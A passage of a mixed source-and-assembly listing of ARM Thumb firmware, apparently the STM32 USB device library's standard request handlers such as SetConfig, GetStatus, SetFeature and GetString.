 800be56:	6078      	str	r0, [r7, #4]
 800be58:	6039      	str	r1, [r7, #0]
  USBD_StatusTypeDef ret = USBD_OK;
 800be5a:	2300      	movs	r3, #0
 800be5c:	73fb      	strb	r3, [r7, #15]
  static uint8_t cfgidx;

  cfgidx = (uint8_t)(req->wValue);
 800be5e:	683b      	ldr	r3, [r7, #0]
 800be60:	885b      	ldrh	r3, [r3, #2]
 800be62:	b2da      	uxtb	r2, r3
 800be64:	4b4e      	ldr	r3, [pc, #312]	; (800bfa0 <USBD_SetConfig+0x150>)
 800be66:	701a      	strb	r2, [r3, #0]

  if (cfgidx > USBD_MAX_NUM_CONFIGURATION)
 800be68:	4b4d      	ldr	r3, [pc, #308]	; (800bfa0 <USBD_SetConfig+0x150>)
 800be6a:	781b      	ldrb	r3, [r3, #0]
 800be6c:	2b01      	cmp	r3, #1
 800be6e:	d905      	bls.n	800be7c <USBD_SetConfig+0x2c>
  {
    USBD_CtlError(pdev, req);
 800be70:	6839      	ldr	r1, [r7, #0]
 800be72:	6878      	ldr	r0, [r7, #4]
 800be74:	f000 f985 	bl	800c182 <USBD_CtlError>
    return USBD_FAIL;
 800be78:	2303      	movs	r3, #3
 800be7a:	e08c      	b.n	800bf96 <USBD_SetConfig+0x146>
  }

  switch (pdev->dev_state)
 800be7c:	687b      	ldr	r3, [r7, #4]
 800be7e:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800be82:	b2db      	uxtb	r3, r3
 800be84:	2b02      	cmp	r3, #2
 800be86:	d002      	beq.n	800be8e <USBD_SetConfig+0x3e>
 800be88:	2b03      	cmp	r3, #3
 800be8a:	d029      	beq.n	800bee0 <USBD_SetConfig+0x90>
 800be8c:	e075      	b.n	800bf7a <USBD_SetConfig+0x12a>
  {
    case USBD_STATE_ADDRESSED:
      if (cfgidx != 0U)
 800be8e:	4b44      	ldr	r3, [pc, #272]	; (800bfa0 <USBD_SetConfig+0x150>)
 800be90:	781b      	ldrb	r3, [r3, #0]
 800be92:	2b00      	cmp	r3, #0
 800be94:	d020      	beq.n	800bed8 <USBD_SetConfig+0x88>
      {
        pdev->dev_config = cfgidx;
 800be96:	4b42      	ldr	r3, [pc, #264]	; (800bfa0 <USBD_SetConfig+0x150>)
 800be98:	781b      	ldrb	r3, [r3, #0]
 800be9a:	461a      	mov	r2, r3
 800be9c:	687b      	ldr	r3, [r7, #4]
 800be9e:	605a      	str	r2, [r3, #4]

        ret = USBD_SetClassConfig(pdev, cfgidx);
 800bea0:	4b3f      	ldr	r3, [pc, #252]	; (800bfa0 <USBD_SetConfig+0x150>)
 800bea2:	781b      	ldrb	r3, [r3, #0]
 800bea4:	4619      	mov	r1, r3
 800bea6:	6878      	ldr	r0, [r7, #4]
 800bea8:	f7ff f848 	bl	800af3c <USBD_SetClassConfig>
 800beac:	4603      	mov	r3, r0
 800beae:	73fb      	strb	r3, [r7, #15]

        if (ret != USBD_OK)
 800beb0:	7bfb      	ldrb	r3, [r7, #15]
 800beb2:	2b00      	cmp	r3, #0
 800beb4:	d008      	beq.n	800bec8 <USBD_SetConfig+0x78>
        {
          USBD_CtlError(pdev, req);
 800beb6:	6839      	ldr	r1, [r7, #0]
 800beb8:	6878      	ldr	r0, [r7, #4]
 800beba:	f000 f962 	bl	800c182 <USBD_CtlError>
          pdev->dev_state = USBD_STATE_ADDRESSED;
 800bebe:	687b      	ldr	r3, [r7, #4]
 800bec0:	2202      	movs	r2, #2
 800bec2:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c
      }
      else
      {
        (void)USBD_CtlSendStatus(pdev);
      }
      break;
 800bec6:	e065      	b.n	800bf94 <USBD_SetConfig+0x144>
          (void)USBD_CtlSendStatus(pdev);
 800bec8:	6878      	ldr	r0, [r7, #4]
 800beca:	f000 fa25 	bl	800c318 <USBD_CtlSendStatus>
          pdev->dev_state = USBD_STATE_CONFIGURED;
 800bece:	687b      	ldr	r3, [r7, #4]
 800bed0:	2203      	movs	r2, #3
 800bed2:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c
      break;
 800bed6:	e05d      	b.n	800bf94 <USBD_SetConfig+0x144>
        (void)USBD_CtlSendStatus(pdev);
 800bed8:	6878      	ldr	r0, [r7, #4]
 800beda:	f000 fa1d 	bl	800c318 <USBD_CtlSendStatus>
      break;
 800bede:	e059      	b.n	800bf94 <USBD_SetConfig+0x144>

    case USBD_STATE_CONFIGURED:
      if (cfgidx == 0U)
 800bee0:	4b2f      	ldr	r3, [pc, #188]	; (800bfa0 <USBD_SetConfig+0x150>)
 800bee2:	781b      	ldrb	r3, [r3, #0]
 800bee4:	2b00      	cmp	r3, #0
 800bee6:	d112      	bne.n	800bf0e <USBD_SetConfig+0xbe>
      {
        pdev->dev_state = USBD_STATE_ADDRESSED;
 800bee8:	687b      	ldr	r3, [r7, #4]
 800beea:	2202      	movs	r2, #2
 800beec:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c
        pdev->dev_config = cfgidx;
 800bef0:	4b2b      	ldr	r3, [pc, #172]	; (800bfa0 <USBD_SetConfig+0x150>)
 800bef2:	781b      	ldrb	r3, [r3, #0]
 800bef4:	461a      	mov	r2, r3
 800bef6:	687b      	ldr	r3, [r7, #4]
 800bef8:	605a      	str	r2, [r3, #4]
        (void)USBD_ClrClassConfig(pdev, cfgidx);
 800befa:	4b29      	ldr	r3, [pc, #164]	; (800bfa0 <USBD_SetConfig+0x150>)
 800befc:	781b      	ldrb	r3, [r3, #0]
 800befe:	4619      	mov	r1, r3
 800bf00:	6878      	ldr	r0, [r7, #4]
 800bf02:	f7ff f837 	bl	800af74 <USBD_ClrClassConfig>
        (void)USBD_CtlSendStatus(pdev);
 800bf06:	6878      	ldr	r0, [r7, #4]
 800bf08:	f000 fa06 	bl	800c318 <USBD_CtlSendStatus>
      }
      else
      {
        (void)USBD_CtlSendStatus(pdev);
      }
      break;
 800bf0c:	e042      	b.n	800bf94 <USBD_SetConfig+0x144>
      else if (cfgidx != pdev->dev_config)
 800bf0e:	4b24      	ldr	r3, [pc, #144]	; (800bfa0 <USBD_SetConfig+0x150>)
 800bf10:	781b      	ldrb	r3, [r3, #0]
 800bf12:	461a      	mov	r2, r3
 800bf14:	687b      	ldr	r3, [r7, #4]
 800bf16:	685b      	ldr	r3, [r3, #4]
 800bf18:	429a      	cmp	r2, r3
 800bf1a:	d02a      	beq.n	800bf72 <USBD_SetConfig+0x122>
        (void)USBD_ClrClassConfig(pdev, (uint8_t)pdev->dev_config);
 800bf1c:	687b      	ldr	r3, [r7, #4]
 800bf1e:	685b      	ldr	r3, [r3, #4]
 800bf20:	b2db      	uxtb	r3, r3
 800bf22:	4619      	mov	r1, r3
 800bf24:	6878      	ldr	r0, [r7, #4]
 800bf26:	f7ff f825 	bl	800af74 <USBD_ClrClassConfig>
        pdev->dev_config = cfgidx;
 800bf2a:	4b1d      	ldr	r3, [pc, #116]	; (800bfa0 <USBD_SetConfig+0x150>)
 800bf2c:	781b      	ldrb	r3, [r3, #0]
 800bf2e:	461a      	mov	r2, r3
 800bf30:	687b      	ldr	r3, [r7, #4]
 800bf32:	605a      	str	r2, [r3, #4]
        ret = USBD_SetClassConfig(pdev, cfgidx);
 800bf34:	4b1a      	ldr	r3, [pc, #104]	; (800bfa0 <USBD_SetConfig+0x150>)
 800bf36:	781b      	ldrb	r3, [r3, #0]
 800bf38:	4619      	mov	r1, r3
 800bf3a:	6878      	ldr	r0, [r7, #4]
 800bf3c:	f7fe fffe 	bl	800af3c <USBD_SetClassConfig>
 800bf40:	4603      	mov	r3, r0
 800bf42:	73fb      	strb	r3, [r7, #15]
        if (ret != USBD_OK)
 800bf44:	7bfb      	ldrb	r3, [r7, #15]
 800bf46:	2b00      	cmp	r3, #0
 800bf48:	d00f      	beq.n	800bf6a <USBD_SetConfig+0x11a>
          USBD_CtlError(pdev, req);
 800bf4a:	6839      	ldr	r1, [r7, #0]
 800bf4c:	6878      	ldr	r0, [r7, #4]
 800bf4e:	f000 f918 	bl	800c182 <USBD_CtlError>
          (void)USBD_ClrClassConfig(pdev, (uint8_t)pdev->dev_config);
 800bf52:	687b      	ldr	r3, [r7, #4]
 800bf54:	685b      	ldr	r3, [r3, #4]
 800bf56:	b2db      	uxtb	r3, r3
 800bf58:	4619      	mov	r1, r3
 800bf5a:	6878      	ldr	r0, [r7, #4]
 800bf5c:	f7ff f80a 	bl	800af74 <USBD_ClrClassConfig>
          pdev->dev_state = USBD_STATE_ADDRESSED;
 800bf60:	687b      	ldr	r3, [r7, #4]
 800bf62:	2202      	movs	r2, #2
 800bf64:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c
      break;
 800bf68:	e014      	b.n	800bf94 <USBD_SetConfig+0x144>
          (void)USBD_CtlSendStatus(pdev);
 800bf6a:	6878      	ldr	r0, [r7, #4]
 800bf6c:	f000 f9d4 	bl	800c318 <USBD_CtlSendStatus>
      break;
 800bf70:	e010      	b.n	800bf94 <USBD_SetConfig+0x144>
        (void)USBD_CtlSendStatus(pdev);
 800bf72:	6878      	ldr	r0, [r7, #4]
 800bf74:	f000 f9d0 	bl	800c318 <USBD_CtlSendStatus>
      break;
 800bf78:	e00c      	b.n	800bf94 <USBD_SetConfig+0x144>

    default:
      USBD_CtlError(pdev, req);
 800bf7a:	6839      	ldr	r1, [r7, #0]
 800bf7c:	6878      	ldr	r0, [r7, #4]
 800bf7e:	f000 f900 	bl	800c182 <USBD_CtlError>
      (void)USBD_ClrClassConfig(pdev, cfgidx);
 800bf82:	4b07      	ldr	r3, [pc, #28]	; (800bfa0 <USBD_SetConfig+0x150>)
 800bf84:	781b      	ldrb	r3, [r3, #0]
 800bf86:	4619      	mov	r1, r3
 800bf88:	6878      	ldr	r0, [r7, #4]
 800bf8a:	f7fe fff3 	bl	800af74 <USBD_ClrClassConfig>
      ret = USBD_FAIL;
 800bf8e:	2303      	movs	r3, #3
 800bf90:	73fb      	strb	r3, [r7, #15]
      break;
 800bf92:	bf00      	nop
  }

  return ret;
 800bf94:	7bfb      	ldrb	r3, [r7, #15]
}
 800bf96:	4618      	mov	r0, r3
 800bf98:	3710      	adds	r7, #16
 800bf9a:	46bd      	mov	sp, r7
 800bf9c:	bd80      	pop	{r7, pc}
 800bf9e:	bf00      	nop
 800bfa0:	200003bc 	.word	0x200003bc

0800bfa4 <USBD_GetConfig>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
static void USBD_GetConfig(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800bfa4:	b580      	push	{r7, lr}
 800bfa6:	b082      	sub	sp, #8
 800bfa8:	af00      	add	r7, sp, #0
 800bfaa:	6078      	str	r0, [r7, #4]
 800bfac:	6039      	str	r1, [r7, #0]
  if (req->wLength != 1U)
 800bfae:	683b      	ldr	r3, [r7, #0]
 800bfb0:	88db      	ldrh	r3, [r3, #6]
 800bfb2:	2b01      	cmp	r3, #1
 800bfb4:	d004      	beq.n	800bfc0 <USBD_GetConfig+0x1c>
  {
    USBD_CtlError(pdev, req);
 800bfb6:	6839      	ldr	r1, [r7, #0]
 800bfb8:	6878      	ldr	r0, [r7, #4]
 800bfba:	f000 f8e2 	bl	800c182 <USBD_CtlError>
      default:
        USBD_CtlError(pdev, req);
        break;
    }
  }
}
 800bfbe:	e023      	b.n	800c008 <USBD_GetConfig+0x64>
    switch (pdev->dev_state)
 800bfc0:	687b      	ldr	r3, [r7, #4]
 800bfc2:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800bfc6:	b2db      	uxtb	r3, r3
 800bfc8:	2b02      	cmp	r3, #2
 800bfca:	dc02      	bgt.n	800bfd2 <USBD_GetConfig+0x2e>
 800bfcc:	2b00      	cmp	r3, #0
 800bfce:	dc03      	bgt.n	800bfd8 <USBD_GetConfig+0x34>
 800bfd0:	e015      	b.n	800bffe <USBD_GetConfig+0x5a>
 800bfd2:	2b03      	cmp	r3, #3
 800bfd4:	d00b      	beq.n	800bfee <USBD_GetConfig+0x4a>
 800bfd6:	e012      	b.n	800bffe <USBD_GetConfig+0x5a>
        pdev->dev_default_config = 0U;
 800bfd8:	687b      	ldr	r3, [r7, #4]
 800bfda:	2200      	movs	r2, #0
 800bfdc:	609a      	str	r2, [r3, #8]
        (void)USBD_CtlSendData(pdev, (uint8_t *)&pdev->dev_default_config, 1U);
 800bfde:	687b      	ldr	r3, [r7, #4]
 800bfe0:	3308      	adds	r3, #8
 800bfe2:	2201      	movs	r2, #1
 800bfe4:	4619      	mov	r1, r3
 800bfe6:	6878      	ldr	r0, [r7, #4]
 800bfe8:	f000 f93c 	bl	800c264 <USBD_CtlSendData>
        break;
 800bfec:	e00c      	b.n	800c008 <USBD_GetConfig+0x64>
        (void)USBD_CtlSendData(pdev, (uint8_t *)&pdev->dev_config, 1U);
 800bfee:	687b      	ldr	r3, [r7, #4]
 800bff0:	3304      	adds	r3, #4
 800bff2:	2201      	movs	r2, #1
 800bff4:	4619      	mov	r1, r3
 800bff6:	6878      	ldr	r0, [r7, #4]
 800bff8:	f000 f934 	bl	800c264 <USBD_CtlSendData>
        break;
 800bffc:	e004      	b.n	800c008 <USBD_GetConfig+0x64>
        USBD_CtlError(pdev, req);
 800bffe:	6839      	ldr	r1, [r7, #0]
 800c000:	6878      	ldr	r0, [r7, #4]
 800c002:	f000 f8be 	bl	800c182 <USBD_CtlError>
        break;
 800c006:	bf00      	nop
}
 800c008:	bf00      	nop
 800c00a:	3708      	adds	r7, #8
 800c00c:	46bd      	mov	sp, r7
 800c00e:	bd80      	pop	{r7, pc}

0800c010 <USBD_GetStatus>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
static void USBD_GetStatus(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800c010:	b580      	push	{r7, lr}
 800c012:	b082      	sub	sp, #8
 800c014:	af00      	add	r7, sp, #0
 800c016:	6078      	str	r0, [r7, #4]
 800c018:	6039      	str	r1, [r7, #0]
  switch (pdev->dev_state)
 800c01a:	687b      	ldr	r3, [r7, #4]
 800c01c:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800c020:	b2db      	uxtb	r3, r3
 800c022:	3b01      	subs	r3, #1
 800c024:	2b02      	cmp	r3, #2
 800c026:	d81e      	bhi.n	800c066 <USBD_GetStatus+0x56>
  {
    case USBD_STATE_DEFAULT:
    case USBD_STATE_ADDRESSED:
    case USBD_STATE_CONFIGURED:
      if (req->wLength != 0x2U)
 800c028:	683b      	ldr	r3, [r7, #0]
 800c02a:	88db      	ldrh	r3, [r3, #6]
 800c02c:	2b02      	cmp	r3, #2
 800c02e:	d004      	beq.n	800c03a <USBD_GetStatus+0x2a>
      {
        USBD_CtlError(pdev, req);
 800c030:	6839      	ldr	r1, [r7, #0]
 800c032:	6878      	ldr	r0, [r7, #4]
 800c034:	f000 f8a5 	bl	800c182 <USBD_CtlError>
        break;
 800c038:	e01a      	b.n	800c070 <USBD_GetStatus+0x60>
      }

#if (USBD_SELF_POWERED == 1U)
      pdev->dev_config_status = USB_CONFIG_SELF_POWERED;
 800c03a:	687b      	ldr	r3, [r7, #4]
 800c03c:	2201      	movs	r2, #1
 800c03e:	60da      	str	r2, [r3, #12]
#else
      pdev->dev_config_status = 0U;
#endif /* USBD_SELF_POWERED */

      if (pdev->dev_remote_wakeup != 0U)
 800c040:	687b      	ldr	r3, [r7, #4]
 800c042:	f8d3 32a4 	ldr.w	r3, [r3, #676]	; 0x2a4
 800c046:	2b00      	cmp	r3, #0
 800c048:	d005      	beq.n	800c056 <USBD_GetStatus+0x46>
      {
        pdev->dev_config_status |= USB_CONFIG_REMOTE_WAKEUP;
 800c04a:	687b      	ldr	r3, [r7, #4]
 800c04c:	68db      	ldr	r3, [r3, #12]
 800c04e:	f043 0202 	orr.w	r2, r3, #2
 800c052:	687b      	ldr	r3, [r7, #4]
 800c054:	60da      	str	r2, [r3, #12]
      }

      (void)USBD_CtlSendData(pdev, (uint8_t *)&pdev->dev_config_status, 2U);
 800c056:	687b      	ldr	r3, [r7, #4]
 800c058:	330c      	adds	r3, #12
 800c05a:	2202      	movs	r2, #2
 800c05c:	4619      	mov	r1, r3
 800c05e:	6878      	ldr	r0, [r7, #4]
 800c060:	f000 f900 	bl	800c264 <USBD_CtlSendData>
      break;
 800c064:	e004      	b.n	800c070 <USBD_GetStatus+0x60>

    default:
      USBD_CtlError(pdev, req);
 800c066:	6839      	ldr	r1, [r7, #0]
 800c068:	6878      	ldr	r0, [r7, #4]
 800c06a:	f000 f88a 	bl	800c182 <USBD_CtlError>
      break;
 800c06e:	bf00      	nop
  }
}
 800c070:	bf00      	nop
 800c072:	3708      	adds	r7, #8
 800c074:	46bd      	mov	sp, r7
 800c076:	bd80      	pop	{r7, pc}

0800c078 <USBD_SetFeature>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
static void USBD_SetFeature(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800c078:	b580      	push	{r7, lr}
 800c07a:	b082      	sub	sp, #8
 800c07c:	af00      	add	r7, sp, #0
 800c07e:	6078      	str	r0, [r7, #4]
 800c080:	6039      	str	r1, [r7, #0]
  if (req->wValue == USB_FEATURE_REMOTE_WAKEUP)
 800c082:	683b      	ldr	r3, [r7, #0]
 800c084:	885b      	ldrh	r3, [r3, #2]
 800c086:	2b01      	cmp	r3, #1
 800c088:	d107      	bne.n	800c09a <USBD_SetFeature+0x22>
  {
    pdev->dev_remote_wakeup = 1U;
 800c08a:	687b      	ldr	r3, [r7, #4]
 800c08c:	2201      	movs	r2, #1
 800c08e:	f8c3 22a4 	str.w	r2, [r3, #676]	; 0x2a4
    (void)USBD_CtlSendStatus(pdev);
 800c092:	6878      	ldr	r0, [r7, #4]
 800c094:	f000 f940 	bl	800c318 <USBD_CtlSendStatus>
  }
  else
  {
    USBD_CtlError(pdev, req);
  }
}
 800c098:	e013      	b.n	800c0c2 <USBD_SetFeature+0x4a>
  else if (req->wValue == USB_FEATURE_TEST_MODE)
 800c09a:	683b      	ldr	r3, [r7, #0]
 800c09c:	885b      	ldrh	r3, [r3, #2]
 800c09e:	2b02      	cmp	r3, #2
 800c0a0:	d10b      	bne.n	800c0ba <USBD_SetFeature+0x42>
    pdev->dev_test_mode = (uint8_t)(req->wIndex >> 8);
 800c0a2:	683b      	ldr	r3, [r7, #0]
 800c0a4:	889b      	ldrh	r3, [r3, #4]
 800c0a6:	0a1b      	lsrs	r3, r3, #8
 800c0a8:	b29b      	uxth	r3, r3
 800c0aa:	b2da      	uxtb	r2, r3
 800c0ac:	687b      	ldr	r3, [r7, #4]
 800c0ae:	f883 22a0 	strb.w	r2, [r3, #672]	; 0x2a0
    (void)USBD_CtlSendStatus(pdev);
 800c0b2:	6878      	ldr	r0, [r7, #4]
 800c0b4:	f000 f930 	bl	800c318 <USBD_CtlSendStatus>
}
 800c0b8:	e003      	b.n	800c0c2 <USBD_SetFeature+0x4a>
    USBD_CtlError(pdev, req);
 800c0ba:	6839      	ldr	r1, [r7, #0]
 800c0bc:	6878      	ldr	r0, [r7, #4]
 800c0be:	f000 f860 	bl	800c182 <USBD_CtlError>
}
 800c0c2:	bf00      	nop
 800c0c4:	3708      	adds	r7, #8
 800c0c6:	46bd      	mov	sp, r7
 800c0c8:	bd80      	pop	{r7, pc}

0800c0ca <USBD_ClrFeature>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
static void USBD_ClrFeature(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800c0ca:	b580      	push	{r7, lr}
 800c0cc:	b082      	sub	sp, #8
 800c0ce:	af00      	add	r7, sp, #0
 800c0d0:	6078      	str	r0, [r7, #4]
 800c0d2:	6039      	str	r1, [r7, #0]
  switch (pdev->dev_state)
 800c0d4:	687b      	ldr	r3, [r7, #4]
 800c0d6:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800c0da:	b2db      	uxtb	r3, r3
 800c0dc:	3b01      	subs	r3, #1
 800c0de:	2b02      	cmp	r3, #2
 800c0e0:	d80b      	bhi.n	800c0fa <USBD_ClrFeature+0x30>
  {
    case USBD_STATE_DEFAULT:
    case USBD_STATE_ADDRESSED:
    case USBD_STATE_CONFIGURED:
      if (req->wValue == USB_FEATURE_REMOTE_WAKEUP)
 800c0e2:	683b      	ldr	r3, [r7, #0]
 800c0e4:	885b      	ldrh	r3, [r3, #2]
 800c0e6:	2b01      	cmp	r3, #1
 800c0e8:	d10c      	bne.n	800c104 <USBD_ClrFeature+0x3a>
      {
        pdev->dev_remote_wakeup = 0U;
 800c0ea:	687b      	ldr	r3, [r7, #4]
 800c0ec:	2200      	movs	r2, #0
 800c0ee:	f8c3 22a4 	str.w	r2, [r3, #676]	; 0x2a4
        (void)USBD_CtlSendStatus(pdev);
 800c0f2:	6878      	ldr	r0, [r7, #4]
 800c0f4:	f000 f910 	bl	800c318 <USBD_CtlSendStatus>
      }
      break;
 800c0f8:	e004      	b.n	800c104 <USBD_ClrFeature+0x3a>

    default:
      USBD_CtlError(pdev, req);
 800c0fa:	6839      	ldr	r1, [r7, #0]
 800c0fc:	6878      	ldr	r0, [r7, #4]
 800c0fe:	f000 f840 	bl	800c182 <USBD_CtlError>
      break;
 800c102:	e000      	b.n	800c106 <USBD_ClrFeature+0x3c>
      break;
 800c104:	bf00      	nop
  }
}
 800c106:	bf00      	nop
 800c108:	3708      	adds	r7, #8
 800c10a:	46bd      	mov	sp, r7
 800c10c:	bd80      	pop	{r7, pc}

0800c10e <USBD_ParseSetupRequest>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval None
  */
void USBD_ParseSetupRequest(USBD_SetupReqTypedef *req, uint8_t *pdata)
{
 800c10e:	b580      	push	{r7, lr}
 800c110:	b084      	sub	sp, #16
 800c112:	af00      	add	r7, sp, #0
 800c114:	6078      	str	r0, [r7, #4]
 800c116:	6039      	str	r1, [r7, #0]
  uint8_t *pbuff = pdata;
 800c118:	683b      	ldr	r3, [r7, #0]
 800c11a:	60fb      	str	r3, [r7, #12]

  req->bmRequest = *(uint8_t *)(pbuff);
 800c11c:	68fb      	ldr	r3, [r7, #12]
 800c11e:	781a      	ldrb	r2, [r3, #0]
 800c120:	687b      	ldr	r3, [r7, #4]
 800c122:	701a      	strb	r2, [r3, #0]

  pbuff++;
 800c124:	68fb      	ldr	r3, [r7, #12]
 800c126:	3301      	adds	r3, #1
 800c128:	60fb      	str	r3, [r7, #12]
  req->bRequest = *(uint8_t *)(pbuff);
 800c12a:	68fb      	ldr	r3, [r7, #12]
 800c12c:	781a      	ldrb	r2, [r3, #0]
 800c12e:	687b      	ldr	r3, [r7, #4]
 800c130:	705a      	strb	r2, [r3, #1]

  pbuff++;
 800c132:	68fb      	ldr	r3, [r7, #12]
 800c134:	3301      	adds	r3, #1
 800c136:	60fb      	str	r3, [r7, #12]
  req->wValue = SWAPBYTE(pbuff);
 800c138:	68f8      	ldr	r0, [r7, #12]
 800c13a:	f7ff fa16 	bl	800b56a <SWAPBYTE>
 800c13e:	4603      	mov	r3, r0
 800c140:	461a      	mov	r2, r3
 800c142:	687b      	ldr	r3, [r7, #4]
 800c144:	805a      	strh	r2, [r3, #2]

  pbuff++;
 800c146:	68fb      	ldr	r3, [r7, #12]
 800c148:	3301      	adds	r3, #1
 800c14a:	60fb      	str	r3, [r7, #12]
  pbuff++;
 800c14c:	68fb      	ldr	r3, [r7, #12]
 800c14e:	3301      	adds	r3, #1
 800c150:	60fb      	str	r3, [r7, #12]
  req->wIndex = SWAPBYTE(pbuff);
 800c152:	68f8      	ldr	r0, [r7, #12]
 800c154:	f7ff fa09 	bl	800b56a <SWAPBYTE>
 800c158:	4603      	mov	r3, r0
 800c15a:	461a      	mov	r2, r3
 800c15c:	687b      	ldr	r3, [r7, #4]
 800c15e:	809a      	strh	r2, [r3, #4]

  pbuff++;
 800c160:	68fb      	ldr	r3, [r7, #12]
 800c162:	3301      	adds	r3, #1
 800c164:	60fb      	str	r3, [r7, #12]
  pbuff++;
 800c166:	68fb      	ldr	r3, [r7, #12]
 800c168:	3301      	adds	r3, #1
 800c16a:	60fb      	str	r3, [r7, #12]
  req->wLength = SWAPBYTE(pbuff);
 800c16c:	68f8      	ldr	r0, [r7, #12]
 800c16e:	f7ff f9fc 	bl	800b56a <SWAPBYTE>
 800c172:	4603      	mov	r3, r0
 800c174:	461a      	mov	r2, r3
 800c176:	687b      	ldr	r3, [r7, #4]
 800c178:	80da      	strh	r2, [r3, #6]
}
 800c17a:	bf00      	nop
 800c17c:	3710      	adds	r7, #16
 800c17e:	46bd      	mov	sp, r7
 800c180:	bd80      	pop	{r7, pc}

0800c182 <USBD_CtlError>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval None
  */
void USBD_CtlError(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800c182:	b580      	push	{r7, lr}
 800c184:	b082      	sub	sp, #8
 800c186:	af00      	add	r7, sp, #0
 800c188:	6078      	str	r0, [r7, #4]
 800c18a:	6039      	str	r1, [r7, #0]
  UNUSED(req);

  (void)USBD_LL_StallEP(pdev, 0x80U);
 800c18c:	2180      	movs	r1, #128	; 0x80
 800c18e:	6878      	ldr	r0, [r7, #4]
 800c190:	f000 fd6a 	bl	800cc68 <USBD_LL_StallEP>
  (void)USBD_LL_StallEP(pdev, 0U);
 800c194:	2100      	movs	r1, #0
 800c196:	6878      	ldr	r0, [r7, #4]
 800c198:	f000 fd66 	bl	800cc68 <USBD_LL_StallEP>
}
 800c19c:	bf00      	nop
 800c19e:	3708      	adds	r7, #8
 800c1a0:	46bd      	mov	sp, r7
 800c1a2:	bd80      	pop	{r7, pc}

0800c1a4 <USBD_GetString>:
  * @param  unicode : Formatted string buffer (unicode)
  * @param  len : descriptor length
  * @retval None
  */
void USBD_GetString(uint8_t *desc, uint8_t *unicode, uint16_t *len)
{
 800c1a4:	b580      	push	{r7, lr}
 800c1a6:	b086      	sub	sp, #24
 800c1a8:	af00      	add	r7, sp, #0
 800c1aa:	60f8      	str	r0, [r7, #12]
 800c1ac:	60b9      	str	r1, [r7, #8]
 800c1ae:	607a      	str	r2, [r7, #4]
  uint8_t idx = 0U;
 800c1b0:	2300      	movs	r3, #0
 800c1b2:	75fb      	strb	r3, [r7, #23]
  uint8_t *pdesc;

  if (desc == NULL)
 800c1b4:	68fb      	ldr	r3, [r7, #12]
 800c1b6:	2b00      	cmp	r3, #0
 800c1b8:	d036      	beq.n	800c228 <USBD_GetString+0x84>
  {
    return;
  }

  pdesc = desc;
 800c1ba:	68fb      	ldr	r3, [r7, #12]
 800c1bc:	613b      	str	r3, [r7, #16]
  *len = ((uint16_t)USBD_GetLen(pdesc) * 2U) + 2U;
 800c1be:	6938      	ldr	r0, [r7, #16]
 800c1c0:	f000 f836 	bl	800c230 <USBD_GetLen>
 800c1c4:	4603      	mov	r3, r0
 800c1c6:	3301      	adds	r3, #1
 800c1c8:	b29b      	uxth	r3, r3
 800c1ca:	005b      	lsls	r3, r3, #1
 800c1cc:	b29a      	uxth	r2, r3
 800c1ce:	687b      	ldr	r3, [r7, #4]
 800c1d0:	801a      	strh	r2, [r3, #0]

  unicode[idx] = *(uint8_t *)len;
 800c1d2:	7dfb      	ldrb	r3, [r7, #23]
 800c1d4:	68ba      	ldr	r2, [r7, #8]
 800c1d6:	4413      	add	r3, r2
 800c1d8:	687a      	ldr	r2, [r7, #4]
 800c1da:	7812      	ldrb	r2, [r2, #0]
 800c1dc:	701a      	strb	r2, [r3, #0]
  idx++;
 800c1de:	7dfb      	ldrb	r3, [r7, #23]
 800c1e0:	3301      	adds	r3, #1
 800c1e2:	75fb      	strb	r3, [r7, #23]
  unicode[idx] = USB_DESC_TYPE_STRING;
 800c1e4:	7dfb      	ldrb	r3, [r7, #23]
 800c1e6:	68ba      	ldr	r2, [r7, #8]
 800c1e8:	4413      	add	r3, r2
 800c1ea:	2203      	movs	r2, #3
 800c1ec:	701a      	strb	r2, [r3, #0]
  idx++;
 800c1ee:	7dfb      	ldrb	r3, [r7, #23]
 800c1f0:	3301      	adds	r3, #1
 800c1f2:	75fb      	strb	r3, [r7, #23]

  while (*pdesc != (uint8_t)'\0')
 800c1f4:	e013      	b.n	800c21e <USBD_GetString+0x7a>
  {
    unicode[idx] = *pdesc;
 800c1f6:	7dfb      	ldrb	r3, [r7, #23]
 800c1f8:	68ba      	ldr	r2, [r7, #8]
 800c1fa:	4413      	add	r3, r2
 800c1fc:	693a      	ldr	r2, [r7, #16]
 800c1fe:	7812      	ldrb	r2, [r2, #0]
 800c200:	701a      	strb	r2, [r3, #0]
    pdesc++;
 800c202:	693b      	ldr	r3, [r7, #16]
 800c204:	3301      	adds	r3, #1
 800c206:	613b      	str	r3, [r7, #16]
    idx++;
 800c208:	7dfb      	ldrb	r3, [r7, #23]
 800c20a:	3301      	adds	r3, #1
 800c20c:	75fb      	strb	r3, [r7, #23]

    unicode[idx] = 0U;
 800c20e:	7dfb      	ldrb	r3, [r7, #23]
 800c210:	68ba      	ldr	r2, [r7, #8]
 800c212:	4413      	add	r3, r2
 800c214:	2200      	movs	r2, #0
 800c216:	701a      	strb	r2, [r3, #0]
    idx++;
 800c218:	7dfb      	ldrb	r3, [r7, #23]
 800c21a:	3301      	adds	r3, #1
 800c21c:	75fb      	strb	r3, [r7, #23]
  while (*pdesc != (uint8_t)'\0')
 800c21e:	693b      	ldr	r3, [r7, #16]
 800c220:	781b      	ldrb	r3, [r3, #0]
 800c222:	2b00      	cmp	r3, #0
 800c224:	d1e7      	bne.n	800c1f6 <USBD_GetString+0x52>
 800c226:	e000      	b.n	800c22a <USBD_GetString+0x86>
    return;
